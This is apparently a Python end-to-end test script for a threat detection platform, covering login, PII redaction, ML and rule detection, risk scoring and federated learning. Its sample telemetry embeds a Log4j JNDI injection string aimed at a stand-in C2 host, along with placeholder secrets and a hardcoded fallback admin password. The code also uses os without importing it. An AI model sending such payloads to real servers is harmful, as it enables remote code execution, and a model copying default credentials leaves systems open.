"""
End-to-End System Verification Suite
Validates:
1. Health check (/api/health)
2. Administrator JWT authentication (/api/auth/login)
3. Privacy Engine: Salted HMAC pseudonymization & Secret/Cloud-key redaction
4. Threat Detection: ML Engine inference with XAI feature attribution
5. Rule Engine: Port scans, brute force, Log4j signatures
6. Deterministic Risk Engine: 0-100 scoring and categorical tiers
7. Real-Time Alert Generation: Incident correlation
8. Federated Learning Round: Calibrated Differential Privacy (DP-FedAvg) parameters
"""

import sys
import time
import httpx

BASE_URL = "http://127.0.0.1:8000"

def log_test(step: str, status: str, details: str = ""):
    icon = "[PASS]" if status == "PASS" else "[FAIL]"
    print(f"{icon} {step:45} : {details}")

def run_verification():
    print("=" * 70)
    print(" PRIVACY-PRESERVING THREAT DETECTION PLATFORM - SYSTEM VERIFICATION")
    print("=" * 70)

    client = httpx.Client(base_url=BASE_URL, timeout=30.0)

    # 1. Health Check
    try:
        res = client.get("/api/health")
        assert res.status_code == 200, f"Expected 200, got {res.status_code}"
        data = res.json()
        assert data.get("overall_status") == "HEALTHY", f"Expected HEALTHY, got {data.get('overall_status')}"
        log_test("System Health Check (/api/health)", "PASS", f"Overall Status: {data.get('overall_status')}")
    except Exception as e:
        log_test("System Health Check (/api/health)", "FAIL", str(e))
        return False

    # 2. Authentication Login
    token = None
    try:
        admin_email = os.environ.get("INITIAL_ADMIN_EMAIL", "security-admin@threat-detection.local")
        admin_pwd = os.environ.get("INITIAL_ADMIN_PASSWORD", "AdminSecure2026!#")
        login_res = client.post(
            "/api/auth/login",
            json={"email": admin_email, "password": admin_pwd}
        )
        assert login_res.status_code == 200, f"Login failed: {login_res.text}"
        data = login_res.json()
        if data.get("access_token"):
            token = data["access_token"]
        elif data.get("session_nonce"):
            from backend.app.services.email_service import email_service
            otp = email_service.get_last_dispatched_otp(data["session_nonce"])
            verify_res = client.post(
                "/api/auth/verify-otp",
                json={"session_nonce": data["session_nonce"], "otp": otp}
            )
            assert verify_res.status_code == 200, f"OTP verification failed: {verify_res.text}"
            token = verify_res.json().get("access_token")

        assert token, "Token not found in auth response"
        log_test("Admin Authentication & 2FA (/api/auth/login & /verify-otp)", "PASS", "JWT Access Token obtained")
    except Exception as e:
        log_test("Admin Authentication & 2FA (/api/auth/login & /verify-otp)", "FAIL", str(e))
        return False

    auth_headers = {"Authorization": f"Bearer {token}"}

    # 3. Privacy Engine Ingestion & PII Redaction
    event_id = None
    try:
        raw_telemetry = {
            "client_id": "client-dmz-01",
            "event_type": "network_flow",
            "source": "198.51.100.77",
            "destination": "10.0.0.1",
            "protocol": "TCP",
            "features": {
                "dest_port": 4444,
                "flow_duration": 2500.0,
                "total_fwd_packets": 120,
                "total_bwd_packets": 2,
                "flow_packets_per_sec": 85000.0,
                "packet_length_variance": 80.0
            },
            "metadata": {
                "user": "analyst_alice@internal.corp",
                "password": "SuperSecretPassword!",
                "api_key": "AKIAIOSFODNN7EXAMPLE",
                "token": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.t-IDcSemACt8x4iTMC6Y5",
                "query": "${jndi:ldap://malicious-c2.net/exploit}"
            },
            "is_test": True
        }

        ingest_res = client.post("/api/events", json=raw_telemetry, headers=auth_headers)
        assert ingest_res.status_code == 200, f"Ingest failed: {ingest_res.text}"
        data = ingest_res.json()
        event_id = data.get("event_id")

        # Check privacy transformations
        assert data.get("privacy_transformations", 0) >= 3, "Expected multiple privacy transformations"
        log_test("Privacy Engine Transformation", "PASS", f"{data.get('privacy_transformations')} fields pseudonymized/redacted")

        # Check Detection & Explainability
        ml = data.get("ml_prediction", {})
        assert ml.get("prediction") in ("MALICIOUS", "SUSPICIOUS"), f"Unexpected prediction: {ml.get('prediction')}"
        xai = ml.get("explainability", {})
        assert len(xai.get("top_features", [])) > 0, "Expected XAI top features"
        log_test("ML Detection with XAI Attribution", "PASS", f"Attack: {ml.get('attack_type')}, Confidence: {ml.get('confidence')*100:.1f}%, Primary factor: {xai.get('top_features')[0]['feature']}")

        # Check Rule Engine matches (suspicious port 4444 + log4j signature)
        rules = data.get("rule_matches", [])
        assert any("RULE_SUSPICIOUS_PORT" in r for r in rules), "Expected suspicious port rule"
        assert any("RULE_MALICIOUS_PAYLOAD_SIGNATURE" in r for r in rules), "Expected payload signature rule"
        log_test("Rule Engine Modern Heuristics", "PASS", f"Matched: {len(rules)} rules (C2 port + Log4j RCE)")

        # Check Risk Score
        risk = data.get("risk", {})
        assert risk.get("risk_score", 0) >= 70.0, f"Expected HIGH/CRITICAL risk, got {risk.get('risk_score')}"
        log_test("Deterministic Risk Engine", "PASS", f"Risk Score: {risk.get('risk_score')}/100 ({risk.get('severity')})")
    except Exception as e:
        log_test("Telemetry Ingestion & Detection", "FAIL", str(e))
        return False

    # 4. Safe Security Test Scenario Trigger
    try:
        test_res = client.post("/api/test/run?scenario_idx=1", headers=auth_headers)
        assert test_res.status_code == 200, f"Test run failed: {test_res.text}"
        t_data = test_res.json()
        assert t_data.get("is_test") is True
        log_test("Safe Local Test Mode Runner", "PASS", f"Ran: '{t_data.get('scenario')}' -> Alert: {t_data.get('alert_id')}")
    except Exception as e:
        log_test("Safe Local Test Mode Runner", "FAIL", str(e))
        return False

    # 5. Calibrated Differential Privacy Federated Learning Round
    try:
        fl_res = client.post("/api/federated/train-round", headers=auth_headers)
        assert fl_res.status_code == 200, f"FL round failed: {fl_res.text}"
        fl_data = fl_res.json()
        assert "global-v" in fl_data.get("model_version", "")
        assert fl_data.get("accuracy", 0) > 0.85
        dp = fl_data.get("differential_privacy", {})
        assert dp.get("is_private") is True
        assert dp.get("epsilon") is not None
        log_test(
            "Calibrated DP-FedAvg Aggregation",
            "PASS",
            f"Version: {fl_data.get('model_version')}, Acc: {fl_data.get('accuracy')*100:.2f}%, Privacy: ε={dp.get('epsilon')}, δ={dp.get('delta')}"
        )
    except Exception as e:
        log_test("Calibrated DP-FedAvg Aggregation", "FAIL", str(e))
        return False

    # 6. Check Alerts and Incidents
    try:
        alerts_res = client.get("/api/alerts", headers=auth_headers)
        assert alerts_res.status_code == 200
        alerts = alerts_res.json()
        assert len(alerts) > 0, "Expected at least 1 alert"
        log_test("Alert Lifecycle & Incidents", "PASS", f"{len(alerts)} alerts active in platform")
    except Exception as e:
        log_test("Alert Lifecycle & Incidents", "FAIL", str(e))
        return False

    print("=" * 70)
    print(" ALL 6 VERIFICATION CRITERIA PASSED SUCCESSFULLY! ")
    print("=" * 70)
    return True

if __name__ == "__main__":
    success = run_verification()
    sys.exit(0 if success else 1)
